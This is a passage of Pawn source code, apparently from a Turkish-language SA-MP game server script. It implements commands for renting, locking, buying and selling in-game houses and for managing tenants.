                        GameTextForPlayer(playerid, "~w~Eve Hosgeldin~n~Evinden çýkmak için kapýda /cik yazman yeterli.", 5000, 3);
                        PlayerInfo[playerid][pInt] = HouseInfo[h][hHInteriorWorld];
                        PlayerInfo[playerid][pVW] = 60000+h;
                        SetPlayerVirtualWorld(playerid, h+60000);
                        SendClientMessage(playerid, COLOR_WHITE, "Tebrikler: Artýk istediðin zaman girebilir yada çýkabilirsin.");
                        SendClientMessage(playerid, COLOR_WHITE, "Yardým menüsünü görmek için /yardim yazabilirsin.");
   						PlayerInfo[playerid][pInt] = GetPlayerInterior(playerid);
						PlayerInfo[playerid][pVW] = GetPlayerVirtualWorld(playerid);
						GetPlayerIp(playerid, PlayerInfo[playerid][pIP], 32);
						GetPlayerPos(playerid, PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z]);
						GetPlayerFacingAngle(playerid, PlayerInfo[playerid][pPos_r]);
                        OnPlayerStatsUpdate(playerid);
                        //new ip[32];
                        //GetPlayerIp(playerid,ip,sizeof(ip));
                        //format(string,sizeof(string),"%s (IP: %s) has rented house ID %d (owned by %s) for $%d.",GetPlayerNameEx(playerid),ip,h,HouseInfo[h][hOwner],HouseInfo[h][hRentFee]);
                        //Log("logs/house.log", string);
                        return 1;
                    }
                }
                else
				{
                    SendClientMessage(playerid, COLOR_WHITE, "Bunun için paran yok.");
                    return 1;
                }
            }
        }
    }
    return 1;
}

CMD:kiralamaiptal(playerid, params[])
{
    new playername[MAX_PLAYER_NAME];
    GetPlayerName(playerid, playername, sizeof(playername));
    if(PlayerInfo[playerid][pHouse] != INVALID_HOUSE_ID && strcmp(playername, HouseInfo[PlayerInfo[playerid][pHouse]][hOwner], true) == 0)
	{
        SendClientMessage(playerid, COLOR_WHITE, "   Bu evin sahibisin!");
        return 1;
    }
    if(PlayerInfo[playerid][pRenting] != INVALID_HOUSE_ID)
	{
        PlayerInfo[playerid][pRenting] = INVALID_HOUSE_ID;
        SendClientMessage(playerid, COLOR_WHITE, "Artýk evsizsin.");
    }
    return 1;
}

CMD:ekilit(playerid, params[]) {
	if(PlayerInfo[playerid][pHouse] != INVALID_HOUSE_ID && (IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[PlayerInfo[playerid][pHouse]][hExteriorX], HouseInfo[PlayerInfo[playerid][pHouse]][hExteriorY], HouseInfo[PlayerInfo[playerid][pHouse]][hExteriorZ]) || IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[PlayerInfo[playerid][pHouse]][hInteriorX], HouseInfo[PlayerInfo[playerid][pHouse]][hInteriorY], HouseInfo[PlayerInfo[playerid][pHouse]][hInteriorZ]))) {

		new
			szMessage[30 + MAX_PLAYER_NAME];

		if(HouseInfo[PlayerInfo[playerid][pHouse]][hLock] == 1)
		{
			HouseInfo[PlayerInfo[playerid][pHouse]][hLock] = 0;
			format(szMessage, sizeof(szMessage), "* %s evinin kapýlarýnýn kilidini açtý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, szMessage, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		}
		else
		{
			HouseInfo[PlayerInfo[playerid][pHouse]][hLock] = 1;
			format(szMessage, sizeof(szMessage), "* %s evinin kapýlarýný kilitledi.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, szMessage, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		}
	}
	else if(PlayerInfo[playerid][pHouse2] != INVALID_HOUSE_ID && (IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[PlayerInfo[playerid][pHouse2]][hExteriorX], HouseInfo[PlayerInfo[playerid][pHouse2]][hExteriorY], HouseInfo[PlayerInfo[playerid][pHouse2]][hExteriorZ]) || IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[PlayerInfo[playerid][pHouse2]][hInteriorX], HouseInfo[PlayerInfo[playerid][pHouse2]][hInteriorY], HouseInfo[PlayerInfo[playerid][pHouse2]][hInteriorZ]))) {

		new
			szMessage[30 + MAX_PLAYER_NAME];

		if(HouseInfo[PlayerInfo[playerid][pHouse2]][hLock] == 1)
		{
			HouseInfo[PlayerInfo[playerid][pHouse2]][hLock] = 0;
			format(szMessage, sizeof(szMessage), "* %s evinin kapýlarýnýn kilidini açtý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, szMessage, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		}
		else
		{
			HouseInfo[PlayerInfo[playerid][pHouse2]][hLock] = 1;
			format(szMessage, sizeof(szMessage), "* %s evinin kapýlarýný kilitledi.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, szMessage, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		}
	}
	else if(HouseKey[playerid] != INVALID_HOUSE_ID && (IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[HouseKey[playerid]][hExteriorX], HouseInfo[HouseKey[playerid]][hExteriorY], HouseInfo[HouseKey[playerid]][hExteriorZ]) || IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[HouseKey[playerid]][hInteriorX], HouseInfo[HouseKey[playerid]][hInteriorY], HouseInfo[HouseKey[playerid]][hInteriorZ]))) {
		new
			szMessage[30 + MAX_PLAYER_NAME];
		if(HouseInfo[HouseKey[playerid]][hLock] == 1)
		{
			HouseInfo[HouseKey[playerid]][hLock] = 0;
			format(szMessage, sizeof(szMessage), "* %s evinin kapýlarýnýn kilidini açtý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, szMessage, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		}
		else
		{
			HouseInfo[HouseKey[playerid]][hLock] = 1;
			format(szMessage, sizeof(szMessage), "* %s evinin kapýlarýný kilitledi.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, szMessage, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		}
	}
	else SendClientMessage(playerid, COLOR_GRAD2, "Ya evin yok, yada evinde deðilsin.");
	return 1;
}

CMD:evikirala(playerid, params[]) {
	if(PlayerInfo[playerid][pHouse] != INVALID_HOUSE_ID && (IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[PlayerInfo[playerid][pHouse]][hExteriorX], HouseInfo[PlayerInfo[playerid][pHouse]][hExteriorY], HouseInfo[PlayerInfo[playerid][pHouse]][hExteriorZ]) || IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[PlayerInfo[playerid][pHouse]][hInteriorX], HouseInfo[PlayerInfo[playerid][pHouse]][hInteriorY], HouseInfo[PlayerInfo[playerid][pHouse]][hInteriorZ]))) {

		new
			szMessage[128];

		if(!HouseInfo[PlayerInfo[playerid][pHouse]][hRentable]) {
			HouseInfo[PlayerInfo[playerid][pHouse]][hRentable] = 1;
			format(szMessage, sizeof(szMessage), "Ev sahibi: %s\nLevel: %d\nID: %d\nKira: $%d\nOda kiralamak icin /odakirala",HouseInfo[PlayerInfo[playerid][pHouse]][hOwner],HouseInfo[PlayerInfo[playerid][pHouse]][hLevel],PlayerInfo[playerid][pHouse],HouseInfo[PlayerInfo[playerid][pHouse]][hRentFee]);
			UpdateDynamic3DTextLabelText(HouseInfo[PlayerInfo[playerid][pHouse]][hTextID], COLOR_HOUSEGREEN, szMessage);
			SendClientMessage(playerid, COLOR_WHITE, "Bu ev artýk kiralanabilir.");
		}
		else {
			HouseInfo[PlayerInfo[playerid][pHouse]][hRentable] = 0;
			format(szMessage, sizeof(szMessage), "Ev sahibi: %s\nLevel: %d\nID: %d",HouseInfo[PlayerInfo[playerid][pHouse]][hOwner],HouseInfo[PlayerInfo[playerid][pHouse]][hLevel],PlayerInfo[playerid][pHouse]);
			UpdateDynamic3DTextLabelText(HouseInfo[PlayerInfo[playerid][pHouse]][hTextID], COLOR_HOUSEGREEN, szMessage);
			SendClientMessage(playerid, COLOR_WHITE, "Bu ev artýk kiralanabilir deðil.");
		}
	}
	else if(PlayerInfo[playerid][pHouse2] != INVALID_HOUSE_ID && (IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[PlayerInfo[playerid][pHouse2]][hExteriorX], HouseInfo[PlayerInfo[playerid][pHouse2]][hExteriorY], HouseInfo[PlayerInfo[playerid][pHouse2]][hExteriorZ]) || IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[PlayerInfo[playerid][pHouse2]][hInteriorX], HouseInfo[PlayerInfo[playerid][pHouse2]][hInteriorY], HouseInfo[PlayerInfo[playerid][pHouse2]][hInteriorZ]))) {
		new
			szMessage[128];

		if(!HouseInfo[PlayerInfo[playerid][pHouse2]][hRentable]) {
			HouseInfo[PlayerInfo[playerid][pHouse2]][hRentable] = 1;
			format(szMessage, sizeof(szMessage), "Ev sahibi: %s\nLevel: %d\nID: %d\nKira: $%d\nOda kiralamak icin /odakirala",HouseInfo[PlayerInfo[playerid][pHouse2]][hOwner],HouseInfo[PlayerInfo[playerid][pHouse2]][hLevel],PlayerInfo[playerid][pHouse2],HouseInfo[PlayerInfo[playerid][pHouse2]][hRentFee]);
			UpdateDynamic3DTextLabelText(HouseInfo[PlayerInfo[playerid][pHouse2]][hTextID], COLOR_HOUSEGREEN, szMessage);
			SendClientMessage(playerid, COLOR_WHITE, "Bu ev artýk kiralanabilir.");
		}
		else {
			HouseInfo[PlayerInfo[playerid][pHouse2]][hRentable] = 0;
			format(szMessage, sizeof(szMessage), "Ev sahibi: %s\nLevel: %d\nID: %d",HouseInfo[PlayerInfo[playerid][pHouse2]][hOwner],HouseInfo[PlayerInfo[playerid][pHouse2]][hLevel],PlayerInfo[playerid][pHouse2]);
			UpdateDynamic3DTextLabelText(HouseInfo[PlayerInfo[playerid][pHouse2]][hTextID], COLOR_HOUSEGREEN, szMessage);
			SendClientMessage(playerid, COLOR_WHITE, "Bu ev artýk kiralanabilir deðil.");
		}
	}
	else SendClientMessage(playerid, COLOR_GRAD2, "Ya evin yok, yada evinde deðilsin.");
	return 1;
}

CMD:kirayiayarla(playerid, params[])
{
	new string[128], fee;
	if(sscanf(params, "d", fee)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /kirayiayarla [fee]");

	if(PlayerInfo[playerid][pHouse] != INVALID_HOUSE_ID && (IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[PlayerInfo[playerid][pHouse]][hExteriorX], HouseInfo[PlayerInfo[playerid][pHouse]][hExteriorY], HouseInfo[PlayerInfo[playerid][pHouse]][hExteriorZ]) || IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[PlayerInfo[playerid][pHouse]][hInteriorX], HouseInfo[PlayerInfo[playerid][pHouse]][hInteriorY], HouseInfo[PlayerInfo[playerid][pHouse]][hInteriorZ])))
	{
		if(!(1 <= fee <= 1000))
		{
			SendClientMessage(playerid, COLOR_WHITE, "Minimum kira $1, maksimum kira $1000'dýr.");
		}
		else
		{

			HouseInfo[PlayerInfo[playerid][pHouse]][hRentFee] = fee;
			format(string, sizeof(string), "Evinin kira faturasýný $%i olarak deðiþtirdin.", HouseInfo[PlayerInfo[playerid][pHouse]][hRentFee]);
			SendClientMessage(playerid, COLOR_WHITE, string);

			if(HouseInfo[PlayerInfo[playerid][pHouse]][hRentable]) format(string, sizeof(string), "Ev sahibi: %s\nLevel: %d\nID: %d\nKira: $%d\nOda kiralamak icin /odakirala",HouseInfo[PlayerInfo[playerid][pHouse]][hOwner],HouseInfo[PlayerInfo[playerid][pHouse]][hLevel],PlayerInfo[playerid][pHouse],HouseInfo[PlayerInfo[playerid][pHouse]][hRentFee]);
			else format(string, sizeof(string), "Ev sahibi: %s\nLevel: %d\nID: %d",HouseInfo[PlayerInfo[playerid][pHouse]][hOwner],HouseInfo[PlayerInfo[playerid][pHouse]][hLevel],PlayerInfo[playerid][pHouse]);
			UpdateDynamic3DTextLabelText(HouseInfo[PlayerInfo[playerid][pHouse]][hTextID], COLOR_HOUSEGREEN, string);
		}
	}
	else if(PlayerInfo[playerid][pHouse2] != INVALID_HOUSE_ID && (IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[PlayerInfo[playerid][pHouse2]][hExteriorX], HouseInfo[PlayerInfo[playerid][pHouse2]][hExteriorY], HouseInfo[PlayerInfo[playerid][pHouse2]][hExteriorZ]) || IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[PlayerInfo[playerid][pHouse2]][hInteriorX], HouseInfo[PlayerInfo[playerid][pHouse2]][hInteriorY], HouseInfo[PlayerInfo[playerid][pHouse2]][hInteriorZ])))
	{
		if(!(1 <= fee <= 1000))
		{
			SendClientMessage(playerid, COLOR_WHITE, "Minimum kira $1, maksimum kira $1000'dýr.");
		}
		else {

			HouseInfo[PlayerInfo[playerid][pHouse2]][hRentFee] = fee;
			format(string, sizeof(string), "Evinin kira faturasýný $%i olarak deðiþtirdin.", HouseInfo[PlayerInfo[playerid][pHouse2]][hRentFee]);
			SendClientMessage(playerid, COLOR_WHITE, string);

			if(HouseInfo[PlayerInfo[playerid][pHouse2]][hRentable]) format(string, sizeof(string), "Ev sahibi: %s\nLevel: %d\nID: %d\nKira: $%d\nOda kiralamak icin /odakirala",HouseInfo[PlayerInfo[playerid][pHouse2]][hOwner],HouseInfo[PlayerInfo[playerid][pHouse2]][hLevel],PlayerInfo[playerid][pHouse2],HouseInfo[PlayerInfo[playerid][pHouse2]][hRentFee]);
			else format(string, sizeof(string), "Ev sahibi: %s\nLevel: %d\nID: %d",HouseInfo[PlayerInfo[playerid][pHouse2]][hOwner],HouseInfo[PlayerInfo[playerid][pHouse2]][hLevel],PlayerInfo[playerid][pHouse2]);
			UpdateDynamic3DTextLabelText(HouseInfo[PlayerInfo[playerid][pHouse2]][hTextID], COLOR_HOUSEGREEN, string);
		}
	}
	else SendClientMessage(playerid, COLOR_GRAD2, "Ya evin yok, yada evinde deðilsin.");
	return 1;
}

CMD:kiracicikar(playerid, params[])
{
	new string[128], giveplayerid;
	if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /kiracicikar [Oyuncu ID/Ýsim]");
	if(PlayerInfo[playerid][pHouse] != INVALID_HOUSE_ID && (IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[PlayerInfo[playerid][pHouse]][hExteriorX], HouseInfo[PlayerInfo[playerid][pHouse]][hExteriorY], HouseInfo[PlayerInfo[playerid][pHouse]][hExteriorZ]) || IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[PlayerInfo[playerid][pHouse]][hInteriorX], HouseInfo[PlayerInfo[playerid][pHouse]][hInteriorY], HouseInfo[PlayerInfo[playerid][pHouse]][hInteriorZ])))
	{
		if(IsPlayerConnected(giveplayerid))
		{
			if(giveplayerid == playerid)
			{
				return SendClientMessage(playerid, COLOR_WHITE, "Kendini kiracýlýktan çýkaramazsýn.");
			}
			else if(PlayerInfo[giveplayerid][pRenting] == PlayerInfo[playerid][pHouse])
			{
				format(string, sizeof(string), "%s, seni kiracýlýktan çýkardý.", GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_WHITE, string);

				format(string, sizeof(string), "%s adlý kiþiyi kiracýlýktan çýkardýn.", GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_WHITE, string);

				PlayerInfo[giveplayerid][pRenting] = INVALID_HOUSE_ID;
			}
			else SendClientMessage(playerid, COLOR_WHITE, "Bu kiþi evini kiralamýyor.");
		}
		else SendClientMessage(playerid, COLOR_GRAD2, "Geçersiz oyuncu.");
	}
	else if(PlayerInfo[playerid][pHouse2] != INVALID_HOUSE_ID && (IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[PlayerInfo[playerid][pHouse2]][hExteriorX], HouseInfo[PlayerInfo[playerid][pHouse2]][hExteriorY], HouseInfo[PlayerInfo[playerid][pHouse2]][hExteriorZ]) || IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[PlayerInfo[playerid][pHouse2]][hInteriorX], HouseInfo[PlayerInfo[playerid][pHouse2]][hInteriorY], HouseInfo[PlayerInfo[playerid][pHouse2]][hInteriorZ])))
	{
		if(IsPlayerConnected(giveplayerid))
		{
			if(giveplayerid == playerid)
			{
				return SendClientMessage(playerid, COLOR_WHITE, "Kendini kiracýlýktan çýkaramazsýn.");
			}
			else if(PlayerInfo[giveplayerid][pRenting] == PlayerInfo[playerid][pHouse2])
			{
				format(string, sizeof(string), "%s, seni kiracýlýktan çýkardý.", GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_WHITE, string);

				format(string, sizeof(string), "%s adlý kiþiyi kiracýlýktan çýkardýn.", GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_WHITE, string);

				PlayerInfo[giveplayerid][pRenting] = INVALID_HOUSE_ID;
			}
			else SendClientMessage(playerid, COLOR_WHITE, "Bu kiþi evini kiralamýyor.");
		}
	}
	else SendClientMessage(playerid, COLOR_GRAD2, "Ya evin yok, yada evinde deðilsin.");
	return 1;
}

CMD:kiracilaricikar(playerid, params[])
{
	if(PlayerInfo[playerid][pHouse] != INVALID_HOUSE_ID && (IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[PlayerInfo[playerid][pHouse]][hExteriorX], HouseInfo[PlayerInfo[playerid][pHouse]][hExteriorY], HouseInfo[PlayerInfo[playerid][pHouse]][hExteriorZ]) || IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[PlayerInfo[playerid][pHouse]][hInteriorX], HouseInfo[PlayerInfo[playerid][pHouse]][hInteriorY], HouseInfo[PlayerInfo[playerid][pHouse]][hInteriorZ])))
	{
		new giveplayerid, string[56];
		foreach(Player, i) if(PlayerInfo[i][pRenting] == PlayerInfo[playerid][pHouse]) {
			format(string, sizeof(string), "%s, seni kiracýlýktan çýkardý.", GetPlayerNameEx(playerid));
			SendClientMessage(i, COLOR_WHITE, string);
			PlayerInfo[i][pRenting] = INVALID_HOUSE_ID;
			++giveplayerid;
		}
		format(string, sizeof(string), "%i online kiracýlar, kiracýlýktan atýldý.", giveplayerid);
		SendClientMessage(playerid, COLOR_WHITE, string);
	}
	else if(PlayerInfo[playerid][pHouse2] != INVALID_HOUSE_ID && (IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[PlayerInfo[playerid][pHouse2]][hExteriorX], HouseInfo[PlayerInfo[playerid][pHouse2]][hExteriorY], HouseInfo[PlayerInfo[playerid][pHouse2]][hExteriorZ]) || IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[PlayerInfo[playerid][pHouse2]][hInteriorX], HouseInfo[PlayerInfo[playerid][pHouse2]][hInteriorY], HouseInfo[PlayerInfo[playerid][pHouse2]][hInteriorZ])))
	{
		new giveplayerid, string[56];
		foreach(Player, i) if(PlayerInfo[i][pRenting] == PlayerInfo[playerid][pHouse2]) {
			format(string, sizeof(string), "%s, seni kiracýlýktan çýkardý.", GetPlayerNameEx(playerid));
			SendClientMessage(i, COLOR_WHITE, string);
			PlayerInfo[i][pRenting] = INVALID_HOUSE_ID;
			++giveplayerid;
		}
		format(string, sizeof(string), "%i online kiracýlar, kiracýlýktan atýldý.", giveplayerid);
		SendClientMessage(playerid, COLOR_WHITE, string);
	}
	else SendClientMessage(playerid, COLOR_GRAD2, "Ya evin yok, yada evinde deðilsin.");
	return 1;
}

CMD:evsatinal(playerid, params[])
{
    new string[128];
    new playername[MAX_PLAYER_NAME];
    new sendername[MAX_PLAYER_NAME];
    new Float:oldposx, Float:oldposy, Float:oldposz;
    GetPlayerName(playerid, playername, sizeof(playername));
    GetPlayerPos(playerid, oldposx, oldposy, oldposz);

    if(IsPlayerInRangeOfPoint(playerid,5.0, 0.0, 0.0, 0.0))
    {// This is to prevent players from buying non-ready houses at the 0,0,0  coordinates
        SendClientMessage(playerid, COLOR_WHITE, "Bu mekandaki evleri alamazsýn.");
        return 1;
    }

    for(new h = 0; h < sizeof(HouseInfo); h++)
	{
        if(IsPlayerInRangeOfPoint(playerid,2.0,HouseInfo[h][hExteriorX], HouseInfo[h][hExteriorY], HouseInfo[h][hExteriorZ]))
		{
            if(HouseInfo[h][hOwned] == 0)
			{
                if(PlayerInfo[playerid][pLevel] < HouseInfo[h][hLevel])
				{
                    format(string, sizeof(string), "   Bunu satýn alabilmek için %d level olman gerekiyor.", HouseInfo[h][hLevel]);
                    SendClientMessage(playerid, COLOR_GRAD5, string);
                    return 1;
                }
                if(PlayerInfo[playerid][pHouse] != INVALID_HOUSE_ID)
                {
                    SendClientMessage(playerid, COLOR_GRAD5, "Zaten bir evin var.");
                    return 1;
                }
                if(PlayerInfo[playerid][pHouse] == INVALID_HOUSE_ID)
				{

					if(GetPlayerCash(playerid) >= HouseInfo[h][hValue])
					{
    					if(GetPVarInt(playerid, "BuyHouseConfirm") == 0)
						{
							SetPVarInt(playerid, "BuyHouseConfirm", 1);
							SendClientMessage(playerid, COLOR_WHITE, "Bu evi satýn almak üzeresin. Aldýktan sonra paraný geri alamayacaksýn.");
							SendClientMessage(playerid, COLOR_WHITE, "Evi almak konusunda eminsen, komutu tekrar yaz. (/evsatinal).");
							return 1;
						}
						DeletePVar(playerid, "BuyHouseConfirm");

						PlayerInfo[playerid][pHouse] = h;
						HouseInfo[h][hOwned] = 1;
						HouseInfo[h][hRentable] = 0;
						GetPlayerName(playerid, sendername, sizeof(sendername));
						strmid(HouseInfo[h][hOwner], sendername, 0, strlen(sendername), 255);
						GivePlayerCash(playerid,-HouseInfo[h][hValue]);
						SetPlayerInterior(playerid,HouseInfo[h][hHInteriorWorld]);
						if(HouseInfo[h][hCustomInterior] == 1)
						{
							LoadObjectsForPlayer(playerid);
						}

						format(string, sizeof(string), "* %s kendi evine girdi.", GetPlayerNameEx(playerid));
						ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

						SetPlayerPos(playerid,HouseInfo[h][hInteriorX],HouseInfo[h][hInteriorY],HouseInfo[h][hInteriorZ]);
      					SetPlayerFacingAngle(playerid,HouseInfo[h][hInteriorR]);
        				SetCameraBehindPlayer(playerid);
						GameTextForPlayer(playerid, "~w~Eve Hosgeldin~n~Evinden çýkmak için kapýda /cik yazman yeterli.", 5000, 3);
						PlayerInfo[playerid][pInt] = HouseInfo[h][hHInteriorWorld];
						SendClientMessage(playerid, COLOR_WHITE, "Yeni alýþveriþiniz için tebrikler.");
						SendClientMessage(playerid, COLOR_WHITE, "Type /evyardim to review the help section!");
						SaveHouses();
	 					PlayerInfo[playerid][pInt] = GetPlayerInterior(playerid);
						PlayerInfo[playerid][pVW] = GetPlayerVirtualWorld(playerid);
						GetPlayerIp(playerid, PlayerInfo[playerid][pIP], 32);
						GetPlayerPos(playerid, PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z]);
						GetPlayerFacingAngle(playerid, PlayerInfo[playerid][pPos_r]);
						OnPlayerStatsUpdate(playerid);
						PlayerInfo[playerid][pVW] = h+60000;
						SetPlayerVirtualWorld(playerid, h+60000);
						DestroyPickup(HouseInfo[h][hPickupID]);
						HouseInfo[h][hPickupID] = CreatePickup(1273, 23, HouseInfo[h][hExteriorX], HouseInfo[h][hExteriorY], HouseInfo[h][hExteriorZ], -1);
						format(string, sizeof(string), "Ev sahibi: %s\nLevel: %d\nID: %d",HouseInfo[h][hOwner],HouseInfo[h][hLevel],h);
						UpdateDynamic3DTextLabelText(HouseInfo[h][hTextID], COLOR_HOUSEGREEN, string);
						new ip[32];
						GetPlayerIp(playerid,ip,sizeof(ip));
						format(string,sizeof(string),"%s (IP: %s) adlý kiþi %d ID'li evi $%d'a satýn aldý.",GetPlayerNameEx(playerid),ip,h,HouseInfo[h][hValue]);
						Log("logs/house.log", string);
						return 1;
					}
					else
					{
						SendClientMessage(playerid, COLOR_WHITE, "   Bunun için paran yok.");
						return 1;
					}
				}
				/*else if(PlayerInfo[playerid][pHouse2] == INVALID_HOUSE_ID)
				{
				    if(PlayerInfo[playerid][pDonator] == 0)
				        return SendClientMessage(playerid, COLOR_GREY, "You already own a house!");

					if(GetPlayerCash(playerid) > HouseInfo[h][hValue])
					{
						PlayerInfo[playerid][pHouse2] = h;
						HouseInfo[h][hOwned] = 1;
						HouseInfo[h][hRentable] = 0;
						GetPlayerName(playerid, sendername, sizeof(sendername));
						strmid(HouseInfo[h][hOwner], sendername, 0, strlen(sendername), 255);
						GivePlayerCash(playerid,-HouseInfo[h][hValue]);
						SetPlayerInterior(playerid,HouseInfo[h][hHInteriorWorld]);
						if(HouseInfo[h][hCustomInterior] == 1)
						{
							LoadObjectsForPlayer(playerid);
						}
						SetPlayerPos(playerid,HouseInfo[h][hInteriorX],HouseInfo[h][hInteriorY],HouseInfo[h][hInteriorZ]);
 						SetPlayerFacingAngle(playerid,HouseInfo[h][hInteriorA]);
        				SetCameraBehindPlayer(playerid);
						GameTextForPlayer(playerid, "~w~Eve Hosgeldin~n~Evinden çýkmak için kapýda /cik yazman yeterli.", 5000, 3);
						PlayerInfo[playerid][pInt] = HouseInfo[h][hHInteriorWorld];
						SendClientMessage(playerid, COLOR_WHITE, "Yeni alýþveriþiniz için tebrikler.");
						SendClientMessage(playerid, COLOR_WHITE, "Type /yardim to review the property help section!");
						SaveHouses();
						OnPlayerStatsUpdate(playerid);
						PlayerInfo[playerid][pVW] = h+60000;
						SetPlayerVirtualWorld(playerid, h+60000);
						DestroyPickup(HouseInfo[h][hPickupID]);
						HouseInfo[h][hPickupID] = CreatePickup(1273, 23, HouseInfo[h][hExteriorX], HouseInfo[h][hExteriorY], HouseInfo[h][hExteriorZ], -1);
						format(string, sizeof(string), "Ev sahibi: %s\nLevel: %d\nID: %d",HouseInfo[h][hOwner],HouseInfo[h][hLevel],h);
						UpdateDynamic3DTextLabelText(HouseInfo[h][hTextID], COLOR_HOUSEGREEN, string);
						new ip[32];
						GetPlayerIp(playerid,ip,sizeof(ip));
						format(string,sizeof(string),"%s (IP: %s) adlý kiþi %d ID'li evi $%d'a satýn aldý.",GetPlayerNameEx(playerid),ip,h,HouseInfo[h][hValue]);
						Log("logs/house.log", string);
						return 1;
					}
					else
					{
						SendClientMessage(playerid, COLOR_WHITE, "   You don't have the cash for that!");
						return 1;
					}
				}*/
            }
            else
			{
                SendClientMessage(playerid, COLOR_WHITE, "Bu evin sahibi var.");
            }
        }
    }
    return 1;
}

CMD:evbug(playerid, params[])
{
if(PlayerInfo[playerid][pAdmin] >= 1)
{
new giveplayerid;
if(sscanf(params, "d", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "{FFFFFF}[{FF0000}@{FFFFFF}] KULLANIM: {FFFFFF}/evbug [OyuncuID/Isim]");
PlayerInfo[giveplayerid][pHouse] = INVALID_HOUSE_ID;
PlayerInfo[giveplayerid][pHouse2] = INVALID_HOUSE_ID;
}
return 1;
}

CMD:evisat(playerid, params[])
{
	new string[128];
	new house = PlayerInfo[playerid][pHouse];
	new house2 = PlayerInfo[playerid][pHouse2];

	if(house == INVALID_HOUSE_ID && house2 == INVALID_HOUSE_ID)
	{
		SendClientMessage(playerid, COLOR_WHITE, "Evin yok.");
		return 1;
	}

	if(IsPlayerInRangeOfPoint(playerid, 4.0,HouseInfo[house][hExteriorX],HouseInfo[house][hExteriorY],HouseInfo[house][hExteriorZ]))
	{
		if(GetPVarInt(playerid, "SellHouseConfirm") == 0)
		{
			SetPVarInt(playerid, "SellHouseConfirm", 1);
			SendClientMessage(playerid, COLOR_WHITE, "Evini bedavaya satmak üzeresin. Bunun için para almayacaksýn.");
			SendClientMessage(playerid, COLOR_WHITE, "Evini satmaya eminsen, komutu tekrar yaz (/evisat).");
			return 1;
		}
		DeletePVar(playerid, "SellHouseConfirm");

		ClearHouse(house);
		HouseInfo[house][hLock] = 1;
		format(HouseInfo[house][hOwner], 128, "Nobody");
		HouseInfo[house][hGLUpgrade] = 1;
		PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
		format(string, sizeof(string), "~n~~w~Evini sattin!");
		GameTextForPlayer(playerid, string, 4000, 3);
		PlayerInfo[playerid][pHouse] = INVALID_HOUSE_ID;
		if(PlayerInfo[playerid][pVW] == house+60000)
		{
			SetPlayerInterior(playerid,0);
			SetPlayerPos(playerid,HouseInfo[house][hExteriorX],HouseInfo[house][hExteriorY],HouseInfo[house][hExteriorZ]);
			PlayerInfo[playerid][pInt] = 0;
			PlayerInfo[playerid][pHouse] = INVALID_HOUSE_ID;
		}
		//PlayerInfo[playerid][pInsurance] = 0;
		SaveHouses();

		PlayerInfo[playerid][pInt] = GetPlayerInterior(playerid);
		PlayerInfo[playerid][pVW] = GetPlayerVirtualWorld(playerid);
		GetPlayerIp(playerid, PlayerInfo[playerid][pIP], 32);
		GetPlayerPos(playerid, PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z]);
		GetPlayerFacingAngle(playerid, PlayerInfo[playerid][pPos_r]);
		OnPlayerStatsUpdate(playerid);
		DestroyPickup(HouseInfo[house][hPickupID]);
		HouseInfo[house][hPickupID] = CreatePickup(1273, 23, HouseInfo[house][hExteriorX], HouseInfo[house][hExteriorY], HouseInfo[house][hExteriorZ], -1);
		DestroyDynamic3DTextLabel(HouseInfo[house][hTextID]);
